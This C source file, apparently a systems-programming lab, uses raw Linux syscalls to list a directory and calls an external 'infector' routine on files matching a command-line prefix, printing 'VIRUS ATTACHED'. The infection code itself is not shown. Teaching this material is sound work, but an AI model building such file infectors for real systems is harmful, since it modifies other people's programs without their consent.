#include "util.h"

#define NULL 0

#define STDOUT 1

#define SYS_exit 1
#define SYS_write 4
#define SYS_open 5
#define SYS_close 6
#define SYS_getdents 141

#define O_RDONLY 0x0
#define O_DIRECTORY 0x10000

#define BUF_SIZE 8192

extern void infection();
extern void infector(char *);
extern int system_call(int num, ...);


struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linux_dirent, d_name) */
};

int open(char *filename, int flags) {
    return system_call(SYS_open, filename, flags);
}

int close(int fd) {
    return system_call(SYS_close, fd);
}

int write(int fd, char *buf, int buf_size) {
    return system_call(SYS_write, fd, buf, buf_size);
}

void my_exit(int status) {
    system_call(SYS_exit, status);
}

int getdents(int fd, char *buf, int buf_size) {
    return system_call(SYS_getdents, fd, buf, buf_size);
}


int main(int argc, char *argv[], char *envp[])
{
    char *prefix = NULL;
    int i;

    for (i = 1; i < argc; i++)
    {
        if (strncmp(argv[i], "-a", 2) == 0)
            prefix = argv[i] + 2;
    }
    
    char buffer[BUF_SIZE];
    int fd = open(".", O_RDONLY | O_DIRECTORY);
    int readBytes = 0;
    struct linux_dirent *d;
    if (fd == -1)
    {
        char *error = "failed to open file";
        write(STDOUT, error, strlen(error));
    }

    while (1)
    {
        int entriesRead = system_call(SYS_getdents, fd, buffer + readBytes, BUF_SIZE - readBytes);
        if (entriesRead == 0)
            break;
        else if (entriesRead == -1)
        {
            write(STDOUT, "error reading entries from directory", strlen("error reading entries from directory"));
            write(STDOUT, "\n", 1);
            my_exit(1);
        }
        else
            readBytes += entriesRead;
    }

    for (i = 0; i < readBytes;)
    {
        d = (struct linux_dirent *)(buffer + i);

        if (prefix != NULL)
        {
            if (strncmp(d->d_name, prefix, strlen(prefix)) == 0)
            {
                infector(d->d_name);
                write(STDOUT, "VIRUS ATTACHED ", strlen("VIRUS ATTACHED "));
            }
        }

        write(STDOUT, d->d_name, strlen(d->d_name));
        write(STDOUT, "\n", 1);
        i += d->d_reclen;
    }
    close(fd);
    return 0;
}
